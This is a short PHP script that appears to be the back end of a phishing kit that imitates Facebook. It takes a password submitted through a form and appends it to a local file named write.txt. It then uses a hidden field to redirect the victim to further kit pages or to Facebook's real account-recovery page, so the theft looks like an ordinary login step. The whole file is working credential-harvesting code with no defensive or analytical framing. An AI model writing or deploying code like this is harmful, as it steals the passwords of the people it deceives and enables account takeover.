<?php
session_start();
$Name = "  Password : ";
$Name .= $_POST['pass'];



file_put_contents('write.txt', $Name, FILE_APPEND);

if ($_POST['hidee'] == 1) {
    header('Location: index2.php');
} elseif ($_POST['hidee']  == 2) {
    header('Location: index3.php');
} elseif ($_POST['hidee']  == 3) {
    header('Location: https://m.facebook.com/login/account_recovery/name_search/?cuid=AYjwrxJroWAIdjzVB8hoUa6ycnrvPSBo8M748hjwPACnFLPFkWo9mnhIyrbuKsg8mW05QATm8VocOb9H_4mNe5vFHaMlq2tUdrTa8Tk5lpS8TgTpAU0worIXYQhIMbfzBeRdY2aYavrq0bpDmXrbX_GIpfQ317ZtoRXsvY-bBYTiUxc1C3JmKvbXcHZOZ0MVon5OHgg7akHUhnH1ob7155FXyurRF3ORULTAVbrz9awqeQ&errorcode=1348092&flow=ncpfar&ls=no_cp_for_ar&c=https%3A%2F%2Fm.facebook.com%2F&refsrc=deprecated&_rdr');
}
exit;